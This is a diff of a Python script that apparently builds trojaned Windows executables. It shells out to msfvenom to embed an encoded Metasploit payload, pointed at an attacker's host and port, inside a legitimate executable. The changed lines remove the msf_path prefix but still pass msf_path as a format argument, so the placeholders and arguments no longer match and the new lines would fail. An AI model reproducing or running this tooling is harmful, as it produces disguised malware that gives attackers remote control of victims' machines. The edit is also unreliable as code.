@@ -54,7 +54,7 @@ while 1:
 		
 		if bdtype == '1':
 			PrintInfo("Binding payload to executeable\n")
-			subprocess.Popen("%s/msfvenom -p %s lhost=%s lport=%s -e x86/shikata_ga_nai -i 5 -x %s -f exe > output/%s.exe" % (msf_path, payload, ip, port, infile, outfile), shell=True).wait()
+			subprocess.Popen("msfvenom -p %s lhost=%s lport=%s -e x86/shikata_ga_nai -i 5 -x %s -f exe > output/%s.exe" % (msf_path, payload, ip, port, infile, outfile), shell=True).wait()
 			PrintInfo("Payload output/%s created" % outfile)
 			
 		elif bdtype == '2' or bdtype == '':
@@ -74,7 +74,7 @@ while 1:
 			time.sleep(2)
 			
 			PrintInfo("Binding payload to executeable")
-			subprocess.Popen("cat %s | %s/msfvenom -a x86 --platform windows -x %s -f exe -k > output/%s.exe" % (x86file, msf_path, infile, outfile), shell=True).wait()
+			subprocess.Popen("cat %s | msfvenom -a x86 --platform windows -x %s -f exe -k > output/%s.exe" % (x86file, msf_path, infile, outfile), shell=True).wait()
 			PrintInfo("Payload output/%s created" % outfile)
 			
 			# clean up
